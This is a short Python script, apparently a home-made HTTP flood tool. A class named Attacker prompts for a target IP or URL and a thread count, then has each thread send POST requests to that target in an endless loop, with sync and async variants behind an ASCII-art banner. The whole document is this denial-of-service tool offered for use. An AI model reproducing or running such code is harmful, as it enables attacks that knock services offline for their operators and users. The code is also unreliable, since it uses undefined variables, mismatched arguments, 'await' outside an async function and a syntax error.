import requests as r
import threading 
import aiohttp
import traceback

class Attacker:
    
    def __init__(self, thread_range: int = 0):
        self.thread_range = thread_range
        self.ses = aiohttp.ClientSession

    def post(self, url: str, headers: dict = {}, data: dict = {}):
        if self.loop_range == 0:
            r.post(url, headers)
            print(f'Sent request to {url} using Headers: {headers}.')
            return
        else:
            threads = []
            def post_loop():
                while True:
                    try:
                        r.post(url, headers=headers, data=data)
                        print(f'Sent request to {url} using Headers: {headers}.')
                    except Exception:
                        print(traceback.print_exc())
                        
            for thread in range(self.thread_range):
                th = threading.Thread(target=post_loop, daemon=True)
                threads.append(th)

            for thread in range(self.thread_range): ## Starting threads in the threads list
                threads[thread].start()

            for thread in range(self.thread_range): 
                threads[thread].join()
    
    async def aiopost(self, url: str, headers: dict = {}, data: dict = {}):
        if self.loop_range == 0:
            await self.ses.post(url, headers=headers, data=data)
            print(f'Sent request to {url} using Headers: {headers}.')
            return
        else:
            threads = []
            def post_loop():
                while True:
                    r.post(url, headers)
                    print(f'Sent request to {url} using Headers: {headers}.')

            for thread in range(self.thread_range):
                th = threading.Thread(target=post_loop, daemon=True)
                threads.append(th)

            for thread in range(self.thread_range): ## Starting threads in the threads list
                threads[thread].start()

            for thread in range(self.thread_range): 
                threads[thread].join()

def Cor():
    choice = input("""
   _,.----.     _,.---._                 
 .' .' -   \  ,-.' , -  `.   .-.,.---.   
/==/  ,  ,-' /==/_,  ,  - \ /==/  `   \  
|==|-   |  .|==|   .=.     |==|-, .=., | 
|==|_   `-' \==|_ : ;=:  - |==|   '='  / 
|==|   _  , |==| , '='     |==|- ,   .'  
\==\.       /\==\ -    ,_ /|==|_  . ,'.  
 `-.`.___.-'  '.='. -   .' /==/  /\ ,  ) 
                `--`--''   `--`-`--`--' 
    Async or Sync?: (Async/Sync) """)
    url = input("What ip/url do you wanna send requests to?: ")
    headers = input("Headers, dict format: ") 
    thread_range = input("At what rate is requests going to be sent to this endpoint: ")
    if choice.lower() == 'sync':
        if loop_range:
            Attacker(Loop_range=int(loop_range)).post(url, headers)
        Attacker().post(url, headers)
    elif choice.lower() == 'async'
        if thread_range:
            await Attacker(thread_range=int(thread_range)).aiopost(url, headers)
        await Attacker().aiopost(url, headers)
    else:
        print('Accepted ')
if __name__ == "__main__":
    Cor()